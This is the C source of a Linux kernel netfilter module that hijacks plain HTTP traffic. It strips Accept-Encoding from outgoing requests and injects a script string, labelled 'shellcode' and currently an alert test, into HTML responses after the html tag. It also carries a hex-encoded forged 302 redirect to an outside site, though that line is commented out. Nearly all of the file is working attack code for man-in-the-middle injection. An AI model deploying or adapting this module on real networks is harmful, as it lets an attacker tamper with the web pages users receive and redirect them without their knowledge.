#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/if_packet.h>
#include <linux/socket.h>
#include <linux/skbuff.h>

#include <net/ip.h>
#include <net/tcp.h>

#include <net/sock.h>
#include <net/netfilter/nf_nat.h>
#include <net/netfilter/nf_nat_helper.h>
#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_expect.h>

static struct nf_hook_ops nfho;

char shellcode[] = "<script>alert('hijacking test!')</script>";
char target_ip[] = "\xb6\xfe\xe3\xcc";
char hack_str[] = "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x31\x36\x30\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x0d\x0a\x44\x61\x74\x65\x3a\x20\x4d\x6f\x6e\x2c\x20\x31\x36\x20\x4d\x61\x79\x20\x32\x30\x31\x36\x20\x30\x38\x3a\x32\x34\x3a\x33\x32\x20\x47\x4d\x54\x0d\x0a\x4C\x6F\x63\x61\x74\x69\x6F\x6E\x3A\x20\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x68\x69\x74\x68\x79\x2E\x63\x6E\x2F\x74\x65\x73\x74\x2E\x68\x74\x6D\x6C\x0D\x0A\x53\x65\x72\x76\x65\x72\x3a\x20\x41\x70\x61\x63\x68\x65\x0d\x0a\x0d\x0a\x3c\x68\x74\x6d\x6c\x3e\x0d\x0a\x3c\x68\x65\x61\x64\x3e\x3c\x74\x69\x74\x6c\x65\x3e\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x2f\x68\x65\x61\x64\x3e\x0d\x0a\x3c\x62\x6f\x64\x79\x20\x62\x67\x63\x6f\x6c\x6f\x72\x3d\x22\x77\x68\x69\x74\x65\x22\x3e\x0d\x0a\x3c\x63\x65\x6e\x74\x65\x72\x3e\x3c\x68\x31\x3e\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x3c\x2f\x68\x31\x3e\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x0d\x0a\x3c\x68\x72\x3e\x3c\x63\x65\x6e\x74\x65\x72\x3e\x6e\x67\x69\x6e\x78\x2f\x31\x2e\x32\x2e\x34\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x0d\x0a\x3c\x2f\x62\x6f\x64\x79\x3e\x0d\x0a\x3c\x2f\x68\x74\x6d\x6c\x3e\x0d\x0a";

typedef struct Pseudo_Header {
	unsigned int saddr;
	unsigned int daddr;
	unsigned char res;
	unsigned char proto;
	unsigned short len;
}pse_hd;

unsigned short checksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;

	uint16_t * w = addr;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= sizeof(uint16_t);
	}

	if (nleft == 1) {
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcph)
{
	unsigned short tcp_len;
	unsigned short ret = 0;
	unsigned short ip_len = 0;
	char *buf = NULL;
	ip_len = (ip_hd->ihl & 0x0f) * 4;
	tcp_len = ntohs(ip_hd->tot_len) - ((ip_hd->ihl & 0x0f) * 4);
	buf = kmalloc(tcp_len + sizeof(pse_hd), GFP_KERNEL);
	if(buf == NULL)
	{
		printk(KERN_ALERT "hook_ipv4: Error in malloc mem\n");
		return 0;
	}

	pse_hd *phd = (pse_hd *)buf;
	phd->saddr = ip_hd->saddr;
	phd->daddr = ip_hd->daddr;
	phd->res = 0;
	phd->proto = IPPROTO_TCP;
	phd->len = htons(tcp_len);
	memcpy(buf+sizeof(pse_hd),tcph,tcp_len);
	tcph = (struct tcphdr *)(buf+sizeof(pse_hd));
	tcph->check = 0;
	ret = checksum((unsigned short *)buf, tcp_len+sizeof(pse_hd));
	kfree(buf);
	return ret; 
}

int delete_padding(char *buf)
{
	char *pl = NULL;
	char *pr = NULL;
	
	pl = strstr(buf,"<");
	pr = strstr(buf,">");
	if(pl != NULL && pr != NULL)
	{
		if((long long)pl - (long long)pr > 0)
		{
			memset(buf,' ',(long long)pl - (long long)buf);
		}
	}
}

int check_insert(char *pkg)
{
	int max_size = 0;
	int len = 0;
	char *phtml = NULL;
	char *pbody = NULL;
	char *ptemp = NULL;
	
	if(strstr(pkg,"<html") != NULL){
		phtml = strstr(pkg,"<html");
		phtml += 5;
	}else if(strstr(pkg,"<!DOCTYPE html") != NULL){
		phtml = strstr(pkg,"<!DOCTYPE html");
		phtml += 14;
	}else{
		return 0;
	}

	printk(KERN_ALERT "hook_ipv4: HTML tag found\n");
		
	phtml[0] = '>';
	memcpy(phtml + 1,shellcode,strlen(shellcode));
	delete_padding(phtml + 1 + strlen(shellcode));
	
	return 1;
}

int delete_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Accept-Encoding found");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	printk(KERN_ALERT "hook_ipv4: Delete Coding: %d\n",len);
	
	memset(pK - 2,' ',len + 2);
	return 1;
}

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);
	unsigned short iph_len = ip_hdrlen(skb);
	unsigned short tol_len = ntohs(iph->tot_len);

	if (iph->protocol == IPPROTO_TCP)
	{
		struct tcphdr *tcph = tcp_hdr(skb);
		unsigned int src_ip = (unsigned int)iph->saddr;
		unsigned int dest_ip = (unsigned int)iph->daddr;

		unsigned int src_port = (unsigned int)ntohs(tcph->source);
		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
		
		if (src_port == 80)
		{

			if (memcmp(pkg,"HTTP/1.1",8) != 0)
			{
				return NF_ACCEPT;
			}
			//memcpy(pkg,hack_str,strlen(hack_str));
			if(check_insert(pkg))
			{
				printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
				printk(KERN_ALERT "hook_ipv4: Insert success\n");
			}
		}
		else if (dest_port == 80)
		{
			if (memcmp(pkg,"GET / HTTP/1.1",strlen("GET / HTTP/1.1")) != 0)
			{
				return NF_ACCEPT;
			}
			
			delete_encoding(pkg);
		}

		unsigned short cs = checksum_tcp(iph, tcph);
		tcph->check = cs;
	}
	return NF_ACCEPT;
}

int init_module(void)
{
	nfho.hook = hook_func;
	nfho.hooknum = NF_INET_PRE_ROUTING;
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_MANGLE;
	nf_register_hook(&nfho);
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

void cleanup_module(void)
{
	nf_unregister_hook(&nfho);
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}


